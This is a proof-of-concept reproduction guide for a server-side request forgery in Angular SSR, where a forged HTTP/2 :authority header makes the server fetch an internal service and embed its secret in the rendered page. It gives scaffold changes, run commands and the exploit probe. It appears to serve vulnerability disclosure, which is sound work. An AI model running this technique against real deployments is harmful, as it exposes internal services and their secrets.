# C9 PoC — Angular SSR HTTP/2 `:authority` SSRF

Canonical reproduction. Tested on `@angular/ssr@21.2.8` / `@angular/build@21.2.8`, Node 25.9.0, darwin/arm64.

## Scaffold

`ng new c9-authority --ssr` default. Post-scaffold changes:

1. `src/app/app.routes.server.ts` — `RenderMode.Prerender` → `RenderMode.Server` (per-request SSR).
2. `src/app/app.config.ts` — added `provideHttpClient(withFetch())`.
3. `src/app/app.ts` — component injects `REQUEST`, parses `request.url`, issues `http.get(${parsed.protocol}//${parsed.host}/probe)`. Realistic "canonical self-probe" pattern for SSR health/debug.
4. `src/app/app.html` — renders `request.url`, probe target, probe body.
5. `src/server.ts` — `node:http2` server calling `angularApp.handle(req)`. HTTP/2 is a first-class input type per `AngularNodeAppEngine.handle()` type signature: `request: IncomingMessage | Http2ServerRequest | Request`.
6. `angular.json` — `security.allowedHosts: ["localhost", "127.0.0.1"]` (realistic: localhost used for internal probes/health checks alongside the primary domain).

No modification to `targets/angular-cli` source. All vulnerable code is the shipped `@angular/ssr@21.2.8` library in `node_modules`.

## Install + build

```
npm install
npx ng build
```

## Run

Terminal A — internal mock service:

```
INTERNAL_SECRET=mysql-root-secret node mock-internal.mjs
# → 127.0.0.1:13306
```

Terminal B — Angular SSR (HTTP/2 h2c):

```
SELF_SECRET=public-abc PORT=4000 node dist/xfh-comma-leak/server/server.mjs
# → http://127.0.0.1:4000
```

## Three probes

```
# Baseline: legitimate request
node probe.mjs 127.0.0.1:4000 /

# Exploit: port-pivot via :authority
node probe.mjs 127.0.0.1:13306 /
# → SSR HTML contains body fetched from 127.0.0.1:13306

# Control: disallowed hostname
node probe.mjs evil.example /
# → 400 Bad Request
```

Evidence capture is in `../evidence/`.

## Cleanup

```
pkill -f mock-internal
pkill -f "dist/xfh-comma-leak/server"
```
